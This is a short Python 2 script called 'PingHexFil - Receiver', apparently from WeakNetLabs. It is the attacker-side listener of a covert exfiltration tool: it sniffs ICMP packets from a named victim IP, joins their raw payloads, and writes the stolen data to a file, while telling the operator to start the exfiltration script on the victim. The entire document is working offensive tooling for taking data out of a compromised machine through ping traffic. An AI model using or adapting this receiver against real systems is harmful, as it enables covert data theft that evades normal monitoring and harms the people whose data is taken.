#!/usr/bin/python
# recieve the exfiltrated data via ICMP
#
from sys import argv
from scapy.all import sniff

def usage():
    print "\n PingHexFil - Receiver\n 2019 WeakNetLabs\n Usage: ./recvdata.py (OUTPUT FILE) (VICTIM IP) (COUNT)\n"
    exit(1)

if (len(argv)!=4):
    usage()

fileName=argv[1]
victimIP=argv[2]
packetCount=argv[3]

print "[+] Waiting for data from: "+victimIP
print "[+] Writing to file: "+fileName
print "[+] Packet count: "+packetCount
print "[+] Begin exfiltration script on victim now ..."
data=sniff(filter="icmp and host "+victimIP,count=int(packetCount))
token=0
fileData="" # placeholder for the string of data
for packet in data: # loop through packets and concatenate the data
    fileData+=packet["Raw"].load
fh=open(fileName,"w") # overwrite it
fh.write(fileData)
fh.close() # close it up
print "[+] Transfer complete. File "+fileName+" written."
